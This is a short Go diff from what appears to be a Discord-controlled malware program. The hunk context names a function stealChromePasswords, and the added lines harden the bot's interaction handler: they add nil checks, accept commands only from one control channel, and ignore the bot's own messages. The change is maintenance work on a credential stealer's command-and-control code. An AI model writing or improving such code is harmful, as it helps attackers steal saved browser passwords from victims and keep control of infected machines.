@@ -1536,6 +1536,25 @@ func stealChromePasswords() (map[string][]map[string]string, error) {
 }
 
 func InteractionHandler(s *discordgo.Session, i *discordgo.InteractionCreate) {
+
+	if i == nil {
+		fmt.Println("Interaction is nil")
+		return
+	}
+
+	// Ensure we handle interactions correctly
+	if i.Type == discordgo.InteractionMessageComponent && i.Message == nil {
+		fmt.Println("InteractionMessageComponent without a Message")
+		return
+	}
+
+	// Check for correct channel and ignore bot's own interactions
+	if (i.Type == discordgo.InteractionApplicationCommand && i.ChannelID != MyChannelId) ||
+		(i.Type == discordgo.InteractionMessageComponent && i.Message.ChannelID != MyChannelId) ||
+		(i.Member.User.ID == s.State.User.ID) {
+		return
+	}
+	
 	switch i.Type {
 	case discordgo.InteractionMessageComponent:
 		HandleButtonInteraction(s, i) // Separate function to handle button clicks
